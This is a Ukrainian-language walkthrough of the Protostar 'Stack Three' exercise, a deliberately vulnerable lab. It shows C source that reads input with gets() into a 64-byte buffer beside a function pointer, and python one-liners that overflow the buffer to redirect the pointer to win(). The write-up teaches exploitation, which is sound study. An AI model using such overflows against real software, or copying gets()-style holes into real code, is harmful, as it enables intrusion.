## [Stack Three](http://exploit.education/protostar/stack-three/)

Stack3 розглядає змінні середовища, як їх можна встановити, а також перезаписувати покажчики функцій, що зберігаються в стеку (як прелюдія до перезапису збереженого EIP).

Переходимо у директорію із завданням:  
```cd /opt/protostar/bin/```

Вихідний код:  
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

Даний приклад коду виглядає дещо по-іншому. Немає змінної, яку потрібно модифікувати. Є тільки функція, яка ніколи не викликається і функція, яка викликається, але не задекларована.
Це натякає нам на перезапис EIP для виклику іншої функції. Тільки спочатку потрібно з'ясувати, яка адреса функції ```win()```. Із цим допоможе каманда ```objdump```:  
```objdump -x stack3 | grep win```  

Отже, маємо адрес функції  0x08048424.  

Тепер потрібно дізнатися скільки нам треба перезаписати до змінної ```fp```:  
```python -c "print 'a'*65" | ./stack3``` 

Як і очікувалося, ми отримали 0x00000061. Тобто, як і раніше, потрібно записати 64 байти у буфер, а далі адрес функції у реверсі (little endian):  
```python -c "print('a' * 64 + '\x08\x04\x84\x24'[::-1])" | ./stack3```